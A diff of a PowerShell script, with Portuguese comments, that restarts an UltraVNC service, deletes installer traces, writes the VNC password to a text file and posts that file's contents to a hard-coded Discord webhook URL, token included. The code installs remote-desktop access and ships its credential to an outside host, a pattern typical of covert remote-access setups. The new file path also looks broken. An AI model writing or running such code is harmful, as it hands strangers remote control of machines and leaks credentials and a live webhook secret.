@@ -53,20 +53,18 @@ echo "Iniciando Servico UltraVNC."
 net stop uvnc_service
 net start uvnc_service
 
-# Caminho do arquivo .txt gerado pelo seu script original
-$arquivoTxt = "$env:USERPROFILE\Desktop\VNC Senha.txt"
+echo "Finalizando Instalacao."
+rm $env:USERPROFILE\Desktop\UltraVNC*
+echo "Instalacao do VNC bem sucedida"  > "$env:USERPROFILE\Documents\VNC Senha.txt"
+echo "Senha $a" >> "$env:USERPROFILE\Documents\VNC Senha.txt"
+$wshell = New-Object -ComObject Wscript.Shell
 
-# Ler o conteúdo do arquivo .txt
-$conteudoTxt = Get-Content -Path $arquivoTxt -Raw
+$conteudo = Get-Content -Path "USERPROFILE\Documents\VNC Senha.txt"
+$webhookUrl = "https://discord.com/api/webhooks/1186839699998900224/maAvNFQo7zAuyMb1LUTewrGxSEXMW8XO2iqSgvngflsXlMSJ-ZhErKINHUHfCA5z0pv_"
 
-# URL do webhook do Discord
-$urlWebhook = "https://discord.com/api/webhooks/1186839699998900224/maAvNFQo7zAuyMb1LUTewrGxSEXMW8XO2iqSgvngflsXlMSJ-ZhErKINHUHfCA5z0pv_"
+$body = @{
+    content = $conteudo
+}
 
-# Montar o JSON com os dados a serem enviados para o Discord
-$jsonBody = @{
-    content = $conteudoTxt
-} | ConvertTo-Json
-
-# Enviar o conteúdo para o Discord via POST usando Invoke-RestMethod
-Invoke-RestMethod -Uri $urlWebhook -Method Post -ContentType 'application/json' -Body $jsonBody
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (ConvertTo-Json $body) -ContentType "application/json"
 exit
